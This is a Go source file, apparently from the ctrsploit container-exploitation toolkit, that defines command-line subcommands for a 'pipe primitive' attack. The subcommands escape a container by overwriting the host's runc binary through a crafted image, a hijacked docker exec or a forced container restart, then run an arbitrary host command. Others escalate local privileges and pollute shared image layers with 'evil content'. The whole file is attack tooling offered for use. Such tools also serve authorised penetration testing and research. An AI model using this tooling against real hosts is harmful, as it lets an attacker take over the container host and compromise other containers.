package pipeprimitive

import (
	"context"
	"fmt"

	"github.com/ctrsploit/ctrsploit/pkg/crash"
	"github.com/ctrsploit/ctrsploit/pkg/image"
	"github.com/urfave/cli/v3"
)

func Command(primitive Primitive, aliases []string, usage string) *cli.Command {
	return &cli.Command{
		Name:    primitive.GetExpName(),
		Aliases: aliases,
		Usage:   usage,
		Commands: []*cli.Command{
			{
				Name:    "escape",
				Aliases: []string{"e"},
				Usage:   fmt.Sprintf("container escape by using %s", primitive.GetExpName()),
				Commands: []*cli.Command{
					{
						Name:  "image",
						Usage: "generate a runc overwrite escape image",
						Flags: []cli.Flag{
							&cli.StringFlag{Name: "dir", Aliases: []string{"d"},
								Value: fmt.Sprintf("poc-%s-escape", primitive.GetExpName()),
								Usage: "the directory to create the PoC image files"},
							&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true,
								Usage: "host command to execute after runc is overwritten"},
							&cli.StringFlag{Name: "mode",
								Value: EscapeImageModeStart,
								Usage: "escape image `start|exec` mode: start captures runc start with a fake loader; exec captures runc exec triggered by HEALTHCHECK",
								Validator: func(mode string) error {
									return ValidateEscapeImageMode(mode)
								}},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							payload, err := resolveRuncOverwritePayload(primitive, cmd.String("cmd"))
							if err != nil {
								return err
							}
							provider, ok := primitive.(EscapeImageWriterProvider)
							if !ok {
								return fmt.Errorf("%s does not provide an escape image writer", primitive.GetExpName())
							}
							var extraFiles map[string][]byte
							if provider, ok := primitive.(EscapeImageExtraFileProvider); ok {
								extraFiles = provider.EscapeImageExtraFiles()
							}
							return GenerateEscapeImageWithMode(cmd.String("dir"), cmd.String("mode"), provider.EscapeImageWriter(), payload, extraFiles)
						},
					},
					{
						Name:  "exec",
						Usage: "overwrite an exec target and wait for docker exec to capture runc",
						Flags: []cli.Flag{
							&cli.StringFlag{Name: "target", Aliases: []string{"t"},
								Value: "/bin/sh",
								Usage: "container executable to overwrite with #!/proc/self/exe"},
							&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true,
								Usage: "host command to execute after runc is overwritten"},
							&cli.DurationFlag{Name: "timeout",
								Usage: "timeout for waiting to capture runc; 0 means wait forever"},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							payload, err := resolveRuncOverwritePayload(primitive, cmd.String("cmd"))
							if err != nil {
								return err
							}
							return EscapeExec(primitive, cmd.String("target"), payload, cmd.Duration("timeout"))
						},
					},
					{
						Name:  "restart",
						Usage: "overwrite the running entrypoint and trigger a container restart to capture runc",
						Flags: []cli.Flag{
							&cli.IntFlag{Name: "pid",
								Value: 1,
								Usage: "pid whose executable should be overwritten and restarted"},
							&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true,
								Usage: "host command to execute after runc is overwritten"},
							&cli.StringFlag{Name: "restart-method",
								Value: crash.MethodAuto,
								Usage: "restart trigger methods: auto,all,cgroup-kill,sigkill,kill-all,oom (comma-separated)"},
							&cli.DurationFlag{Name: "timeout",
								Usage: "timeout for triggering restart; 0 means no timeout"},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							methods := crash.ParseMethods(cmd.String("restart-method"))
							payload, err := resolveRuncOverwritePayload(primitive, cmd.String("cmd"))
							if err != nil {
								return err
							}
							return EscapeRestart(primitive, cmd.Int("pid"), payload, cmd.Duration("timeout"), methods...)
						},
					},
				},
			},
			{
				Name:    "privilege-escalate",
				Aliases: []string{"p"},
				Usage:   fmt.Sprintf("local privilege escalate by using %s", primitive.GetExpName()),
				Action: func(ctx context.Context, cmd *cli.Command) error {
					return EscalateWithIO(primitive, cmd.Reader, cmd.Writer, cmd.ErrWriter)
				},
			},
			{
				Name:    "layers",
				Aliases: []string{"l"},
				Usage:   "analyze shared layers across multiple images to identify cross-container pollution targets",
				Flags: []cli.Flag{
					&cli.StringSliceFlag{Name: "image", Aliases: []string{"i"}, Required: true,
						Usage: "image reference (can be repeated)"},
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					report, err := image.Analyze(cmd.StringSlice("image"))
					if err != nil {
						return err
					}
					report.Print()
					return nil
				},
			},
			{
				Name:    "image-pollution",
				Aliases: []string{"i"},
				Usage:   fmt.Sprintf("image pollution using %s", primitive.GetExpName()),
				Flags: []cli.Flag{
					&cli.StringFlag{Name: "source", Aliases: []string{"s"}, Required: true,
						Usage: "the path of file with evil content"},
					&cli.StringFlag{Name: "destination", Aliases: []string{"d"}, Required: true,
						Usage: "the path of file you want to pollute"},
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					return ImagePollution(primitive, cmd.String("source"), cmd.String("destination"))
				},
			},
			{
				Name:    "clean",
				Aliases: []string{"c"},
				Usage:   "drop host page cache to clear page-cache-only primitive effects",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "sync",
						Usage: "call sync before dropping page cache"},
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					return Clean(cmd.Bool("sync"))
				},
			},
		},
	}
}
